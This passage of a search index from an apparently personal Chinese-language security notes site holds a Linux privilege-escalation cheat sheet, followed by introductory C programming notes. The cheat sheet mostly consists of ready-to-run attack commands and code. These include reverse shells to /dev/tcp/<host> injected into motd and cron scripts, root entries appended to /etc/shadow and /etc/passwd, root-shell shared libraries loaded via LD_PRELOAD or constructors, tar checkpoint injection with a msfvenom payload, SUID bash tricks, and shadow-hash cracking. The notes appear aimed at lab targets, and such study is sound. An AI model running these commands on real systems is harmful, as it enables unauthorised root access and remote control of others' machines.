\u7528\u6237\u7684\u8eab\u4efd\u6267\u884c\u4efb\u4f55\u547d\u4ee4\uff1a</p> <pre><code>permit :wheel\n</code></pre> <p>\u8868\u793a\u5141\u8bb8\u5c5e\u4e8e\"wheel\"\u7ec4\u7684\u7528\u6237\u4f7f\u7528doas\u547d\u4ee4\u3002\u901a\u5e38\u60c5\u51b5\u4e0b\uff0cOpenBSD\u7cfb\u7edf\u4e2d\u7684\u7ba1\u7406\u5458\u7528\u6237\u4f1a\u88ab\u5206\u914d\u5230\"wheel\"\u7ec4\uff0c\u6240\u4ee5\u8fd9\u4e2a\u914d\u7f6e\u9879\u5141\u8bb8\u8fd9\u4e9b\u7ba1\u7406\u5458\u7528\u6237\u4f7f\u7528doas\u6765\u6267\u884c\u7279\u6743\u64cd\u4f5c\u3002</p> <p>\u4f8b\u5982\uff0c\u4e5f\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u89c4\u5219\uff0c\u5141\u8bb8\u7279\u5b9a\u7528\u6237\u65e0\u9700\u5bc6\u7801\u5c31\u53ef\u4ee5\u6267\u884c\u7279\u5b9a\u547d\u4ee4\uff1a</p> <pre><code>permit nopass larry cmd /sbin/reboot\n</code></pre> <p>\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u7528\u6237 larry \u53ef\u4ee5\u65e0\u9700\u5bc6\u7801\u5c31\u53ef\u4ee5\u6267\u884c /sbin/reboot \u547d\u4ee4\u3002</p>"},{"location":"Pentest/6.priviledge_escalation/linux/11.motd_mechanism/","title":"motd mechanism","text":"<pre><code>ls -l /etc/update-motd.d\n# \u82e5\u6709\u5199\u5165\u6743\u9650\uff0c\u5219\u6ce8\u5165\u63d0\u6743\u4ee3\u7801\necho 'bash -c \"bash -i &gt;&amp; /dev/tcp/&lt;host&gt;/1234 0&gt;&amp;1\"' &gt;&gt; /etc/update-motd.d/&lt;onefile&gt;\n</code></pre>"},{"location":"Pentest/6.priviledge_escalation/linux/12.prng_for_ssh/","title":"prng for ssh private key","text":"<p>\u9776\u673a\u4e2d\u53ef\u4ee5\u83b7\u53d6ssh\u5b58\u50a8\u7684\u516c\u94a5\u6587\u4ef6 (/home/user/.ssh/authorized_keys)\uff0c\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\uff0c\u751f\u6210\u5168\u90e8\u7684\u79c1\u94a5\uff0c\u8fdb\u884c\u78b0\u649e\u5bf9\u6bd4\u516c\u94a5\u3002</p> <pre><code>searchsploit -m 5622.txt\nwget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/5622.tar.bz2\ntar vjxf 5622.tar.bz2\ngrep -lr 'xxxxxxxxxxxxxxxxx'\nssh -i &lt;priv_key&gt; &lt;user&gt;@&lt;ip&gt;\n</code></pre>"},{"location":"Pentest/6.priviledge_escalation/linux/12.prng_for_ssh/#ssh-asym-encrypt","title":"ssh asym encrypt","text":"<p>\u5728\u8fdc\u7a0b\u4e3b\u673a\u4e0a\uff0c\u6bcf\u4e2a\u7528\u6237\u901a\u5e38\u90fd\u6709\u4e00\u4e2a\u540d\u4e3a\u00a0<code>.ssh</code>\u00a0\u7684\u9690\u85cf\u6587\u4ef6\u5939\uff0c\u5176\u4e2d\u5305\u542b\u4e86\u4e00\u4e9b\u4e0e SSH \u76f8\u5173\u7684\u6587\u4ef6\uff0c\u5176\u4e2d\u4e4b\u4e00\u5c31\u662f\u00a0<code>authorized_keys</code>\u3002\u8be5\u6587\u4ef6\u5305\u542b\u4e86\u4e00\u7cfb\u5217\u7684\u516c\u94a5\uff0c\u7528\u4e8e\u9a8c\u8bc1\u7528\u6237\u7684\u8eab\u4efd\u3002</p> <p>\u5f53\u4f60\u5c1d\u8bd5\u4f7f\u7528 SSH \u5bc6\u94a5\u5bf9\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u65f6\uff0c\u8fdc\u7a0b\u4e3b\u673a\u4f1a\u68c0\u67e5\u4f60\u63d0\u4f9b\u7684\u516c\u94a5\u662f\u5426\u5b58\u5728\u4e8e\u00a0<code>authorized_keys</code>\u00a0\u6587\u4ef6\u4e2d\u3002\u5982\u679c\u5b58\u5728\u5339\u914d\u7684\u516c\u94a5\uff0c\u8fdc\u7a0b\u4e3b\u673a\u5c06\u9a8c\u8bc1\u6210\u529f\uff0c\u5141\u8bb8\u4f60\u767b\u5f55\u7cfb\u7edf\u3002</p> <p><code>authorized_keys</code>\u00a0\u6587\u4ef6\u7684\u6743\u9650\u5e94\u8be5\u8bbe\u7f6e\u4e3a\u53ea\u6709\u7528\u6237\u672c\u4eba\u53ef\u8bfb\u5199\uff08\u4f8b\u5982\uff0c\u6743\u9650\u8bbe\u7f6e\u4e3a 600\uff09\uff0c\u4ee5\u786e\u4fdd\u79c1\u94a5\u7684\u5b89\u5168\u6027\u3002</p>"},{"location":"Pentest/6.priviledge_escalation/linux/2.shadow/","title":"Readable","text":"<p>\u7834\u89e3root\u5bc6\u7801</p> <pre><code>cat /etc/shadow | grep ':\\$' | tee hash\njohn --wordlist=&lt;rockyou.txt&gt; hash\n</code></pre>"},{"location":"Pentest/6.priviledge_escalation/linux/2.shadow/#writable","title":"Writable","text":"<p>\u4fee\u6539root\u5bc6\u7801</p> <pre><code>mkpasswd -m sha-512 qwe\necho 'root:&lt;passwd&gt;:19509:0:99999:7:::' &gt;&gt; /etc/shadow\n</code></pre>"},{"location":"Pentest/6.priviledge_escalation/linux/3.passwd/","title":"Writable","text":"<pre><code>openssl passwd -1 -salt qwe qwe\nopenssl passwd qwe\necho '&lt;passwd&gt;' &gt;&gt; /etc/passwd\n</code></pre>"},{"location":"Pentest/6.priviledge_escalation/linux/4.sudo_env_vars/","title":"sudo environment variables","text":"<p><code>env_keep+=LD_PRELOAD</code>\u662f\u6307\u5728\u4f7f\u7528<code>sudo</code>\u547d\u4ee4\u65f6\uff0c\u73af\u5883\u53d8\u91cf<code>LD_PRELOAD</code>\u5c06\u4fdd\u6301\u4e0d\u53d8\u3002<code>LD_PRELOAD</code>\u662f\u4e00\u4e2a\u73af\u5883\u53d8\u91cf\uff0c\u5b83\u5141\u8bb8\u7528\u6237\u5728\u7a0b\u5e8f\u52a0\u8f7d\u65f6\u9884\u5148\u52a0\u8f7d\u6307\u5b9a\u7684\u5171\u4eab\u5e93\u3002</p> <p>\u56e0\u6b64\uff0c\u53ef\u4ee5\u628a\u63d0\u6743\u7684\u4ee3\u7801\u5199\u5165\u5171\u4eab\u5e93\u4e2d\uff0c\u4f7f\u7528\u4e0d\u9700\u8981\u5bc6\u7801\u7684\u547d\u4ee4\u9884\u52a0\u8f7d\u8fd9\u4e2a\u5171\u4eab\u5e93\u5b9e\u73b0\u63d0\u6743\u3002</p> <p>\u5f53\u524d\u9776\u673a\u53ef\u4ee5\u6267\u884c\u4ec0\u4e48\u7cfb\u7edf\u547d\u4ee4\uff0csudo\u73af\u5883\u53d8\u91cf\u8bbe\u7f6e\u662f\u4ec0\u4e48</p> <pre><code>sudo -l\n# env_rest, env_keep+=LD_PRELOAD\n# (root) NOPASSWD: /binfile\ngcc -fPIC -shared -nostartfiles -o shell.so shell.c\nsudo LD_PRELOAD=/tmp/shell.so /binfile\n</code></pre> <pre><code># file: pri.c\n\n#include &lt;stdio.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;stdlib.h&gt;\n\n// filename: shell.c\n// define a shared object\nvoid _init() {\n    unsetenv(\"LD_PRELOAD\"); # once is enough\n    setgid(0);\n    setuid(0);\n    system(\"/bin/bash -p\");\n}\n</code></pre>"},{"location":"Pentest/6.priviledge_escalation/linux/5.schedule_jobs/","title":"schedule jobs","text":""},{"location":"Pentest/6.priviledge_escalation/linux/5.schedule_jobs/#_1","title":"\u6587\u4ef6\u6743\u9650","text":"<p>root\u6743\u9650\u81ea\u52a8\u4efb\u52a1\u811a\u672c\u53ef\u5199\uff0c\u5199\u5165\u53cd\u5f39shell</p> <pre><code>cat /etc/crontab\n# root /path/file writable\necho 'bash -i &gt;&amp; /dev/tcp/&lt;host&gt;/1234 0&gt;&amp;1' &gt;&gt; /file\n</code></pre>"},{"location":"Pentest/6.priviledge_escalation/linux/5.schedule_jobs/#path","title":"PATH\u73af\u5883\u53d8\u91cf","text":"<p>root\u6743\u9650\u81ea\u52a8\u4efb\u52a1\u5b58\u5728\uff0c\u8def\u5f84\u4e3a\u76f8\u5bf9\u5730\u5740\uff0cPATH\u4e2d\u5b58\u5728\u53ef\u5199\u6587\u4ef6\u5939\uff0c\u5728\u5176\u4e2d\u7f16\u5199\u540c\u540d\u81ea\u52a8\u4efb\u52a1\u6587\u4ef6</p> <ul> <li>\u5199\u5165\u53cd\u5f39shell</li> </ul> <pre><code>echo '#!/bin/bash' &gt; OnePATH/file\necho 'bash -i &gt;&amp; /dev/tcp/&lt;host&gt;/1234 0&gt;&amp;1' &gt;&gt; OnePATH/file\n</code></pre> <ul> <li>\u5199\u5165\u63d0\u6743\u4ee3\u7801</li> </ul> <pre><code>#!/bin/bash\n\ncp /bin/bash /tmp/rootbash\nchmod +xs /tmp/rootbash\n</code></pre> <pre><code>/tmp/rootbash -p # -p: priviledged, run as suid\n</code></pre>"},{"location":"Pentest/6.priviledge_escalation/linux/5.schedule_jobs/#tarcheckpoint","title":"tar\u547d\u4ee4\u2014checkpoint\u673a\u5236","text":"<p>root\u6743\u9650\u81ea\u52a8\u4efb\u52a1\u811a\u672c\u5b58\u5728\uff0c\u811a\u672c\u4e2d\u5b58\u5728tar\u547d\u4ee4\uff0c\u4f7f\u7528tar\u547d\u4ee4\u7684\u2014checkpoint\u673a\u5236\u6267\u884c\u53cd\u5f39shell\u3002</p> <p>\u539f\u7406\uff1a</p> <p>\u5728 Linux \u7684 <code>tar</code> \u547d\u4ee4\u4e2d\uff0c<code>--checkpoint</code> \u9009\u9879\u7528\u4e8e\u5728\u8bfb\u53d6\u6216\u5199\u5165\u6bcf n \u6761\u8bb0\u5f55\u65f6\u8bbe\u7f6e\u68c0\u67e5\u70b9\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cn \u7684\u503c\u4e3a 10\u3002\u68c0\u67e5\u70b9\u5141\u8bb8\u6211\u4eec\u5b9a\u671f\u6267\u884c\u4efb\u610f\u64cd\u4f5c\u3002 \u8fd9\u4e9b\u64cd\u4f5c\u5305\u62ec\u6682\u505c\u3001\u663e\u793a\u6587\u672c\u6d88\u606f\u4ee5\u53ca\u6267\u884c\u4efb\u610f\u5916\u90e8\u7a0b\u5e8f\u3002\u8fd9\u4e9b\u64cd\u4f5c\u662f\u901a\u8fc7 <code>--checkpoint-action</code> \u9009\u9879\u5b9a\u4e49\u7684\u3002</p> <pre><code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=&lt;host&gt; LPORT=&lt;port&gt; -f elf -o shell.elf\n# /path/to/rshell = path of running tar cmd\ntouch /path/to/rshell--checkpoint=1\ntouch /path/to/rshell--checkpoint-action=exec=shell.elf\n</code></pre>"},{"location":"Pentest/6.priviledge_escalation/linux/5.schedule_jobs/#_2","title":"\u81ea\u52a8\u4efb\u52a1\u65f6\u95f4\u4e2d\u7684\u901a\u914d\u7b26","text":"<p>\u683c\u5f0f</p> <pre><code>m h dom mon dow\n</code></pre> <p>\u5728\u81ea\u52a8\u4efb\u52a1\u4e2d\uff0c\u901a\u914d\u7b26\u7528\u4e8e\u8868\u793a\u4e00\u7ec4\u503c\u3002\u4ee5\u4e0b\u662f\u4e00\u4e9b\u5e38\u89c1\u7684\u901a\u914d\u7b26\u53ca\u5176\u542b\u4e49\uff1a</p> <ul> <li>\uff1a\u8868\u793a\u4efb\u4f55\u53ef\u80fd\u7684\u503c\u3002\u4f8b\u5982\uff0c\u5728 cron \u8868\u8fbe\u5f0f\u4e2d\uff0c\u5982\u679c\u5728\u201c\u5c0f\u65f6\u201d\u5b57\u6bb5\u4e2d\u4f7f\u7528 \uff0c\u5219\u8868\u793a\u201c\u6bcf\u4e2a\u5c0f\u65f6\u201d\u3002</li> <li>?\uff1a\u8868\u793a\u4e0d\u6307\u5b9a\u503c\u3002\u8fd9\u5728\u67d0\u4e9b\u5b57\u6bb5\uff08\u5982 cron \u8868\u8fbe\u5f0f\u7684\u201c\u65e5\u201d\u548c\u201c\u5468\u201d\u5b57\u6bb5\uff09\u4e2d\u5f88\u6709\u7528\uff0c\u5f53\u4f60\u60f3\u5ffd\u7565\u8fd9\u4e2a\u5b57\u6bb5\u65f6\uff0c\u53ef\u4ee5\u4f7f\u7528 ?\u3002</li> <li>-\uff1a\u8868\u793a\u4e00\u4e2a\u8303\u56f4\u3002\u4f8b\u5982\uff0c\u5728 cron \u8868\u8fbe\u5f0f\u4e2d\uff0c1-5 \u8868\u793a\u201c\u4ece 1 \u5230 5\u201d\u3002</li> <li>,\uff1a\u7528\u4e8e\u6307\u5b9a\u591a\u4e2a\u503c\u3002\u4f8b\u5982\uff0c\u5728 cron \u8868\u8fbe\u5f0f\u4e2d\uff0c1,3,5 \u8868\u793a\u201c1\u30013 \u548c 5\u201d\u3002</li> <li>/\uff1a\u7528\u4e8e\u6307\u5b9a\u95f4\u9694\u503c\u3002\u4f8b\u5982\uff0c\u5728 cron \u8868\u8fbe\u5f0f\u4e2d\uff0c*/5 \u8868\u793a\u201c\u6bcf 5 \u4e2a\u5355\u4f4d\u201d\u3002</li> </ul>"},{"location":"Pentest/6.priviledge_escalation/linux/6.suid/","title":"suid","text":"<pre><code>find / -perm -u=s -type f 2&gt;/dev/null # \u67e5\u627e\u6709SUID\u6743\u9650\u7684\u6587\u4ef6\n</code></pre>"},{"location":"Pentest/6.priviledge_escalation/linux/6.suid/#_1","title":"\u53ef\u6267\u884c\u6587\u4ef6\u5df2\u77e5\u6f0f\u6d1e","text":"<p>\u7528searchsploit\u5bf9SUID\u53ef\u6267\u884c\u6587\u4ef6\u8fdb\u884c\u641c\u96c6\uff0c\u67e5\u770b\u53ef\u5229\u7528\u7684\u6f0f\u6d1e</p>"},{"location":"Pentest/6.priviledge_escalation/linux/6.suid/#_2","title":"\u5171\u4eab\u5e93\u6ce8\u5165","text":"<p>\u5bf9\u6709SUID\u6743\u9650\u7684\u6587\u4ef6\u8fdb\u884c\u5206\u6790\uff0c\u5982\u679c\u6709\u62a5\u9519\u7684\u5185\u5bb9\u8868\u9762\u8fd9\u4e2a\u6587\u4ef6\u8bf7\u6c42\u4e86\u4e00\u4e2a\u5171\u4eab\u5e93\uff0c\u90a3\u4e48\u53ef\u4ee5\u4f2a\u9020\u5171\u4eab\u5e93\u6ce8\u5165\u63d0\u6743\u4ee3\u7801</p> <pre><code>strings &lt;file&gt;\nstrace &lt;file&gt; 2&gt;&amp;1\n</code></pre> <pre><code># file: pri.c\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nstatic void inject() __attribute__((constructor)); # \u5171\u4eab\u5e93\u88ab\u52a0\u8f7d\u65f6\u4f1a\u81ea\u52a8\u6267\u884c\u8fd9\u4e2a\u51fd\u6570\n\nvoid inject() {\n        setgid(0);\n        setuid(0);\n        system(\"/bin/bash -p\");\n}\n</code></pre> <pre><code>gcc -fPIC -shared -o &lt;file.so&gt; &lt;file.c&gt;\n</code></pre> <p>\u5728C\u8bed\u8a00\u4e2d\uff0c<code>__attribute__((constructor))</code> \u662f\u4e00\u4e2a\u7279\u6b8a\u7684\u5c5e\u6027\uff0c\u5b83\u7528\u4e8e\u6307\u5b9a\u4e00\u4e2a\u51fd\u6570\u5728\u7a0b\u5e8f\u8fd0\u884c\u65f6\u7684\u521d\u59cb\u5316\u9636\u6bb5\u88ab\u81ea\u52a8\u8c03\u7528\u3002\u5177\u4f53\u6765\u8bf4\uff0c\u5f53\u7a0b\u5e8f\u52a0\u8f7d\u65f6\uff0c\u5177\u6709\u6b64\u5c5e\u6027\u7684\u51fd\u6570\u4f1a\u5728 main() \u51fd\u6570\u6267\u884c\u4e4b\u524d\u88ab\u81ea\u52a8\u8c03\u7528\u3002\u8fd9\u4e2a\u7279\u6027\u901a\u5e38\u7528\u4e8e\u6267\u884c\u4e00\u4e9b\u5168\u5c40\u521d\u59cb\u5316\u64cd\u4f5c\uff0c\u4f8b\u5982\u521d\u59cb\u5316\u5168\u5c40\u53d8\u91cf\u3001\u6253\u5f00\u6587\u4ef6\u3001\u5efa\u7acb\u8fde\u63a5\u7b49\u3002 \u53e6\u5916\uff0c\u8fd8\u6709\u4e00\u4e2a\u5bf9\u5e94\u7684 <code>__attribute((destructor))__</code> \u5c5e\u6027\uff0c\u5b83\u8ba9\u7cfb\u7edf\u5728 main() \u51fd\u6570\u9000\u51fa\u6216\u8005\u8c03\u7528\u4e86 exit() \u4e4b\u540e\uff0c\u8c03\u7528\u6211\u4eec\u7684\u51fd\u6570\u3002\u5e26\u6709\u8fd9\u4e9b\u4fee\u9970\u5c5e\u6027\u7684\u51fd\u6570\uff0c\u5bf9\u4e8e\u6211\u4eec\u521d\u59cb\u5316\u4e00\u4e9b\u5728\u7a0b\u5e8f\u4e2d\u4f7f\u7528\u7684\u6570\u636e\u975e\u5e38\u6709\u7528\u3002</p>"},{"location":"Pentest/6.priviledge_escalation/linux/6.suid/#_3","title":"\u73af\u5883\u53d8\u91cf\u5229\u7528","text":"<p>\u5bf9\u6709SUID\u6743\u9650\u7684\u6587\u4ef6\u8fdb\u884c\u5206\u6790(strings strace)\uff0c\u5982\u679c\u91cc\u9762\u6709\u76f8\u5bf9\u8def\u5f84\u7684\u547d\u4ee4\u6587\u4ef6\uff0c\u5229\u7528PATH\u73af\u5883\u53d8\u91cf\uff0c\u5219\u53ef\u4ee5\u4f2a\u9020\u6587\u4ef6\u6ce8\u5165\u63d0\u6743\u4ee3\u7801</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid main() {\n        setgid(0);\n        setuid(0);\n        system(\"/bin/bash -p\");\n}\n</code></pre> <pre><code>export PATH=.:$PATH # \u4f7f\u5f97\u5f53\u524d\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u4f18\u5148\u6267\u884c\ngcc -o &lt;file&gt; &lt;file.c&gt;\n/suid-file\n</code></pre>"},{"location":"Pentest/6.priviledge_escalation/linux/6.suid/#suid-shell","title":"SUID-Shell\u529f\u80fd","text":""},{"location":"Pentest/6.priviledge_escalation/linux/6.suid/#1-bash-version-42","title":"(1) bash version &lt; 4.2","text":"<p>bash\u5728\u6267\u884c\u7684\u65f6\u5019\uff0c\u5bf9\u4e8e\u81ea\u8eab\u5b9a\u4e49\u7684\u51fd\u6570\u4f18\u5148\u7ea7\u9ad8\u4e8e\u73af\u5883\u53d8\u91cf\uff08\u7c7b\u4f3c\u4e8e\u73af\u5883\u53d8\u91cf\u8986\u76d6\uff0c\u7528\u66f4\u9ad8\u4f18\u5148\u7ea7\u7684\u73af\u5883\u53d8\u91cf\u52ab\u6301\u6389\u8fd9\u4e2a\u547d\u4ee4\uff0c\u6ce8\u5165\u63d0\u6743\u4ee3\u7801</p> <p>\u5728 Bash \u7248\u672c\u5c0f\u4e8e 4.2 \u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u4f7f\u7528\u8def\u5f84\u7684\u7ec4\u5408\u4f5c\u4e3a\u51fd\u6570\u7684\u540d\u79f0\u6765\u5b9a\u4e49\u51fd\u6570\u3002\u8fd9\u610f\u5473\u7740\u53ef\u4ee5\u4f7f\u7528\u50cf\u6587\u4ef6\u8def\u5f84\u4e00\u6837\u7684\u5b57\u7b26\u4e32\u6765\u547d\u540d\u4f60\u7684\u51fd\u6570\u3002\u4f8b\u5982\uff0c\u4f60\u53ef\u4ee5\u5b9a\u4e49\u4e00\u4e2a\u540d\u4e3a\u00a0<code>dir/subdir/myfunc</code>\u00a0\u7684\u51fd\u6570\u3002\u7136\u540e\uff0c\u4f60\u53ef\u4ee5\u901a\u8fc7\u00a0<code>dir/subdir/myfunc</code>\u00a0\u6765\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\u3002</p> <pre><code>strings &lt;file&gt;\n# /usr/bin/service apache2 start\n\nfunction /usr/bin/service { /bin/bash -p; }\nexport -f /usr/bin/service\n&lt;file&gt;\n</code></pre>"},{"location":"Pentest/6.priviledge_escalation/linux/6.suid/#2-bash-version-44","title":"(2) bash version &lt; 4.4","text":"<p>bash\u7248\u672c\u4f4e\u4e8e4.4\u7684\u65f6\u5019\uff0c\u8c03\u8bd5\u6a21\u5f0f\uff0c\u5bf9bash\u7684\u73af\u5883\u53d8\u91cf\u8fdb\u884c\u8bbe\u7f6e</p> <pre><code>env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash;chmod +xs /tmp/rootbash)' /usr/bin/&lt;file&gt;\n</code></pre> <ul> <li><code>env -i</code>\uff1a\u8fd9\u4e2a\u547d\u4ee4\u4f1a\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u73af\u5883\uff0c\u5e76\u5728\u8fd9\u4e2a\u65b0\u73af\u5883\u4e2d\u8fd0\u884c\u540e\u9762\u7684\u547d\u4ee4\u3002\u65b0\u73af\u5883\u4e2d\u4e0d\u5305\u542b\u4efb\u4f55\u539f\u6765\u7684\u73af\u5883\u53d8\u91cf\u3002</li> <li><code>SHELLOPTS=xtrace</code>\uff1a\u8fd9\u4e2a\u547d\u4ee4\u4f1a\u8bbe\u7f6e SHELLOPTS \u73af\u5883\u53d8\u91cf\u7684\u503c\u4e3a xtrace\u3002xtrace \u662f Bash \u7684\u4e00\u4e2a\u9009\u9879\uff0c\u5f53\u5b83\u88ab\u8bbe\u7f6e\u65f6\uff0cBash \u4f1a\u6253\u5370\u51fa\u6bcf\u4e00\u6761\u6267\u884c\u7684\u547d\u4ee4\u3002\u8fd9\u5bf9\u4e8e\u8c03\u8bd5\u811a\u672c\u975e\u5e38\u6709\u7528\u3002</li> <li><code>PS4='$(cp /bin/bash /tmp/rootbash;chmod +xs /tmp/rootbash)'</code>\uff1a\u8fd9\u4e2a\u547d\u4ee4\u4f1a\u8bbe\u7f6e PS4 \u73af\u5883\u53d8\u91cf\u7684\u503c\u4e3a '$(cp /bin/bash /tmp/rootbash;chmod +xs /tmp/rootbash)'\u3002PS4 \u662f Bash \u7684\u4e00\u4e2a\u7279\u6b8a\u53d8\u91cf\uff0c\u5b83\u5b9a\u4e49\u4e86\u5728 xtrace \u6a21\u5f0f\u4e0b\u6bcf\u4e00\u6761\u547d\u4ee4\u6267\u884c\u524d\u6253\u5370\u7684\u63d0\u793a\u7b26\u3002\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u6211\u4eec\u5c06\u63d0\u793a\u7b26\u8bbe\u7f6e\u4e3a\u4e00\u4e2a\u547d\u4ee4\uff0c\u8fd9\u4e2a\u547d\u4ee4\u4f1a\u590d\u5236 /bin/bash \u5230 /tmp/rootbash\uff0c\u5e76\u7ed9 /tmp/rootbash \u8bbe\u7f6e SUID \u548c\u53ef\u6267\u884c\u6743\u9650\u3002</li> </ul>"},{"location":"Pentest/6.priviledge_escalation/linux/7.password_and_keys/","title":"password and keys","text":""},{"location":"Pentest/6.priviledge_escalation/linux/7.password_and_keys/#history-files","title":"history files","text":"<pre><code>history\ncat ~/.*history | less \ncat ~/.viminfo\n</code></pre>"},{"location":"Pentest/6.priviledge_escalation/linux/7.password_and_keys/#config-files","title":"config files","text":"<p>Config files often contain passwords in plaintext or other reversible formats.</p> <p>\u901a\u8fc7\u679a\u4e3e\u770b\u5230\u9776\u673a\u4e2d\u6709\u54ea\u4e9b\u5e94\u7528\uff0c\u7136\u540e\u53bb\u5bfb\u627e\u8fd9\u4e9b\u5e94\u7528\u7684\u914d\u7f6e\u6587\u4ef6</p> <pre><code>ls -liah | grep -E *.ovpn\n</code></pre>"},{"location":"Pentest/6.priviledge_escalation/linux/7.password_and_keys/#ssh-keys","title":"ssh keys","text":"<p>\u67e5\u770b\u5bb6\u76ee\u5f55\u4e0b\u662f\u5426\u6709SSH\u5bc6\u94a5</p> <pre><code>ls -liah ~/.ssh\nls -liah /.ssh\n</code></pre> <pre><code>touch id_rsa &amp;&amp; chmod 600 id_rsa\nsudo ssh -i id_rsa root@&lt;ip&gt;\n</code></pre>"},{"location":"Pentest/6.priviledge_escalation/linux/8.nfs/","title":"nfs","text":"<p>NFS\u4f5c\u4e3a\u63d0\u6743\u9014\u5f84</p> <pre><code>cat /etc/exports\n# no_root_squash \u8868\u793a\u53ef\u4ee5\u63d0\u6743\u5229\u7528\n</code></pre> <pre><code>su root\nmkdir /tmp/nfs\nmount -o rw,vers=3 &lt;target&gt;:/tmp /tmp/nfs\ncd /tmp/nfs\nmsfvenom -p linux/x64/exec CMD=\"/bin/bash -p\" -f elf -o shell.elf\nchmod +xs shell.elf\n</code></pre>"},{"location":"Pentest/6.priviledge_escalation/linux/9.kernel_exploits/","title":"kernel exploits","text":"<pre><code>searchsploit Linux Kernel\n</code></pre>"},{"location":"RE/","title":"RE","text":"<ul> <li> Langs<ul> <li> C</li> <li> C++</li> <li> Python</li> </ul> </li> <li> Data Structure</li> <li> Algorithms</li> <li> STL</li> <li> BOOST</li> <li> Concurrent Progrm</li> <li> Windows Internals<ul> <li> SDK</li> <li> MFC</li> <li> System Progrm</li> <li> PE</li> </ul> </li> <li> RE Details<ul> <li> x86/64 Asm</li> <li> C/C++ RE</li> <li> Anti-reversing Techniques</li> <li> Malware Analysis</li> </ul> </li> <li> Network<ul> <li> Principles</li> <li> Windows Network Progrm</li> </ul> </li> </ul>"},{"location":"RE/langs/C/","title":"C Programming","text":""},{"location":"RE/langs/C/#_1","title":"\u57fa\u7840\u77e5\u8bc6","text":""},{"location":"RE/langs/C/#c","title":"C\u8bed\u8a00\u6807\u51c6","text":"<ul> <li>K&amp;R</li> <li>C89/C90</li> <li>C99</li> <li>C11</li> </ul>"},{"location":"RE/langs/C/#c_1","title":"C\u4ee3\u7801\u7f16\u5199\u6b65\u9aa4","text":"<ol> <li>\u786e\u5b9a\u9700\u6c42</li> <li>\u8bbe\u8ba1\u7a0b\u5e8f</li> <li>\u7f16\u5199\u4ee3\u7801</li> <li>\u8fd0\u884c</li> <li>\u6d4b\u8bd5\u548c\u8c03\u8bd5</li> <li>\u7ef4\u62a4\u548c\u4fee\u6539</li> </ol>"},{"location":"RE/langs/C/#_2","title":"\u4e8c\u8fdb\u5236\u4ee3\u7801\u751f\u6210\u6b65\u9aa4","text":"<ol> <li>\u9884\u5904\u7406\uff1a\u590d\u5236\u5934\u6587\u4ef6\u5185\u5bb9\uff0c\u66ff\u6362\u5b8f\u7684\u5185\u5bb9\u7b49</li> <li>\u7f16\u8bd1\uff1a\u5c06C\u4ee3\u7801\u7f16\u8bd1\u4e3a\u6c47\u7f16\u4ee3\u7801</li> <li>\u6c47\u7f16\uff1a\u5c06\u6c47\u7f16\u4ee3\u7801\u6c47\u7f16\u4e3a\u4e8c\u8fdb\u5236\u4ee3\u7801</li> <li>\u94fe\u63a5\uff1a\u52a0\u8f7d\u542f\u52a8\u4ee3\u7801\u548c\u5e93\u6587\u4ef6\u7b49</li> </ol> <pre><code># preprocess\ngcc -E a.c -o a.i\n# compile\ngcc -S a.i -o a.s\n# assemble\ngcc -c a.s -o a.o\n# link\ngcc a.o -o a.out\n</code></pre> <pre><code># 32bit compile\ngcc a.c -m32\n# dependencies:\nsudo apt install build-essential gcc-multilib g++-multilib gcc g++\n</code></pre>"},{"location":"RE/langs/C/#_3","title":"\u8fdb\u5236\u548c\u4f4d","text":"<p>\u8fdb\u5236</p> <ul> <li>bin</li> <li>oct</li> <li>dec</li> <li>hex</li> </ul> <p>\u4f4d</p> <ul> <li>32bit</li> <li>64bit</li> </ul> <p>\u5b57\u5bbd</p> <ul> <li>QWORD 64bit</li> <li>FWORD 48bit</li> <li>DWORD 32bit</li> <li>WORD 16bit</li> <li>BIT 1bit</li> </ul>"},{"location":"RE/langs/C/#vs","title":"VS\u5e38\u89c4\u64cd\u4f5c","text":"<ul> <li>F5 \u8fd0\u884c</li> <li>F9 \u65ad\u70b9</li> <li>F10 \u5355\u6b65\u6b65\u8fc7</li> <li>F11 \u5355\u6b65\u6b65\u5165</li> </ul>"},{"location":"RE/langs/C/#clion","title":"Clion\u5e38\u89c4\u64cd\u4f5c","text":"<p>\u5236\u4f5c\u56fe\u6807\uff1a</p> /usr/share/applications<pre><code>[Desktop Entry]\nEncoding=UTF-8\nName=Clion\nComment=Clion-2023.2\nExec=/home/kali/opt/clion-2023.2/bin/clion.sh\nIcon=/home/kali/opt/clion-2023.2/bin/clion.svg\nCategories=Application;Development;Java;IDE\nVersion=2023.2\nType=Application\n</code></pre> <p>\u5e38\u89c4\u64cd\u4f5c\uff1a</p> <ul> <li>Shift + F10 run</li> <li>Shift + F9 debug</li> <li>F7 \u6b65\u5165</li> <li>F8 \u6b65\u8fc7</li> </ul>"},{"location":"RE/langs/C/#windows-api","title":"Windows API","text":"<ul> <li>A: Ascii</li> <li>W: Unicode</li> <li>Ex: Extended version</li> </ul>"},{"location":"RE/langs/C/#_4","title":"\u57fa\u7840\u6570\u636e\u7c7b\u578b","text":""},{"location":"RE/langs/C/#_5","title":"\u57fa\u7840\u6570\u636e\u7c7b\u578b","text":""},{"location":"RE/langs/C/#_6","title":"\u6574\u6570","text":"<ul> <li>short, 2B</li> <li>int, 4B</li> <li>long, 4B</li> <li>long long, 8B(x64)</li> </ul>"},{"location":"RE/langs/C/#_7","title":"\u6d6e\u70b9\u6570","text":"<ul> <li>float, 4B</li> <li>double, 8B</li> </ul>"},{"location":"RE/langs/C/#_8","title":"\u5b57\u7b26 \u5b57\u7b26\u4e32","text":"<ul> <li>char (ascii), 1B</li> <li>wchar_t (unicode), 2B</li> </ul> <p>sz on 